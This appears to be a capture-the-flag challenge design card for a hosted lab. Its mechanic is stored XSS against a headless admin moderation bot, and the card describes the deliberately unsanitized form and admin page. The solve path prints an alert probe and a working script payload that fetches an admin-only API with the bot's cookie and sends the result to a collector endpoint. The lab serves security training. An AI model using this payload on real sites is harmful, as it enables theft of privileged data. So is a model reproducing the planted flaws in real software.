---
slug: web-stored-xss-bot-exfil
title: Use stored XSS against a moderation bot to exfiltrate an admin-only API
category: Web Application Security
source_ctf: Digital Museum: The Archive of a Breach
difficulty: medium
skills: web, stored-xss, broken-access-control, headless-bot, exfiltration
box_type: hosted
status: built
---

## Mechanic (theme-agnostic)
A public multi-field submission form takes free-text input; one field is written
verbatim into a datastore (here SQLite) with no sanitization or output encoding — a
stored-XSS sink. A privileged, admin-only review/queue page renders every stored
submission without escaping. A real headless-browser moderation bot polls that queue
on a short interval (~30s): it first hits a login route that sets an HttpOnly session
cookie, then loads the review page and lingers (~10s), during which any stored script
executes inside that authenticated admin browser. An internal JSON API returns the
secret but is gated purely by the admin session cookie (401/`{"error":"unauthorized"}`
otherwise), so only the bot can reach it. Because the cookie is HttpOnly it cannot be
read from JavaScript; the payload must instead *act as* the admin — a same-origin
`fetch()` to the internal API is auto-authorized by the bot's cookie — and forward the
response to an attacker-readable collector (a same-origin capture endpoint that stores
data by token and replays it, or any external webhook if the bot has outbound net).
The player reads the exfiltrated response back out of the collector.

## Player solve path
1. Map the app; find the public submission form and confirm which field is echoed back.
   Note guarded/dead-end routes (the admin page 403s, etc.).
2. Confirm stored XSS with a probe (e.g. `<img src=x onerror=alert(1)>`): the markup is
   stored and later served back verbatim.
3. Identify the renderer: a headless moderation bot reviews the queue every ~30s under
   an authenticated admin session whose cookie is HttpOnly (can't be stolen directly).
4. Locate the target + collector: an internal admin-only API returns the secret only
   with the admin cookie (401 otherwise); a same-origin collector stores data by token
   (`?id=<tok>&d=<data>`) and replays it (`?id=<tok>`).
5. Store the weaponized comment:
   `<script>fetch('/internal-api').then(r=>r.text()).then(d=>fetch('/collect?id=TOK&d='+encodeURIComponent(d)))</script>`.
6. Wait for the next review cycle; the script runs as admin, calls the API, and POSTs
   the JSON to the collector.
7. Read the collector back with your token → the secret/flag is inside the captured
   API response.
